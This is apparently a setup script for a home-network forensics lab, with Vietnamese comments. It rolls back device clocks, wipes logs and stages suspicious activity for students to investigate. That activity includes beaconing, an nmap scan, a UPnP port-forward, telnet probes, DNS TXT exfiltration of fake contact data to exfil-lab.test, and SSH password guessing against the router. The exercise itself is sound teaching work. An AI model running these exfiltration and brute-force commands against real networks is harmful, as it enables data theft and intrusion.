# Lab 11 — DỰNG "buổi tối" (người học KHÔNG đọc tệp này trước khi làm lab): tua đồng hồ router + lab7 + android về tối 24/11/2026, rồi android-7f3a
# làm bốn việc ở bốn mốc giờ. Bắt đầu sạch: xoá log từ xa + ufw.log trên lab7, khởi động lại router (log trong RAM mất).
# Chạy: python3 cong-cu/chay-vm.py lab11-dung.bash (~6 phút). Sau đó lab11.bash là phần điều tra. Cuối cùng lab11-tra-gio.bash trả đồng hồ.
sudo truncate -s 0 /var/log/remote/wrt-nha.log /var/log/ufw.log; sudo ufw logging low >/dev/null; echo "đã làm sạch log trên lab7"
@wrt /etc/init.d/sysntpd stop; date -s "2026-11-24 20:46:30" >/dev/null; reboot
sleep 45; sudo timedatectl set-ntp false; sudo date -s "2026-11-24 20:47:20" >/dev/null; date
@android sudo timedatectl set-ntp false; sudo date -s "2026-11-24 20:47:20" >/dev/null; date
@wrt /etc/init.d/sysntpd stop; date -s "2026-11-24 20:47:20" >/dev/null; date
# 20:47 — vào mạng, dùng như bình thường
@android sudo networkctl reconfigure ens3; sleep 5; for n in youtube.com zalo.me vnexpress.net shopee.vn; do dig +short $n | head -n 1; done
# 21:15 — bắt đầu "gọi về" đều đặn
@wrt date -s "2026-11-24 21:15:00" >/dev/null; date
sudo date -s "2026-11-24 21:15:00" >/dev/null; date
@android sudo date -s "2026-11-24 21:15:00" >/dev/null; for i in 1 2 3 4 5 6; do dig +short +tries=1 +time=1 update.cdn-lab.test >/dev/null; sleep 20; done; date
# 22:03 — dò mạng nhà, mở cổng qua UPnP, cố gọi telnet ra Internet
@wrt date -s "2026-11-24 22:03:00" >/dev/null; date
sudo date -s "2026-11-24 22:03:00" >/dev/null; date
@android sudo date -s "2026-11-24 22:03:00" >/dev/null; sudo nmap -sS -Pn -n -p 22,23,80,445,3389,8080 192.168.56.10 192.168.56.177 | grep -E "^Nmap scan|open"; upnpc -u http://192.168.56.1:5000/rootDesc.xml -e svc -a 192.168.56.142 2323 2323 TCP | tail -n 1; for ip in 198.51.100.23 198.51.100.24 203.0.113.9; do nc -z -w2 $ip 23; done; date
# 23:41 — đẩy dữ liệu ra bằng DNS TXT, thử mật khẩu SSH của router
@wrt date -s "2026-11-24 23:41:00" >/dev/null; date
sudo date -s "2026-11-24 23:41:00" >/dev/null; date
@android sudo date -s "2026-11-24 23:41:00" >/dev/null; printf '%s' "danh-ba: an 0901234567; binh 0912345678; chi 0987654321" | base32 -w0 | tr -d = | tr A-Z a-z | fold -w 50 | nl -w1 -s' ' | while read -r so manh; do dig +short +tries=1 +time=1 TXT "$manh.$so.t.exfil-lab.test" >/dev/null; done; for p in admin root 12345678; do sshpass -p $p ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password root@192.168.56.1 true 2>/dev/null; done; date
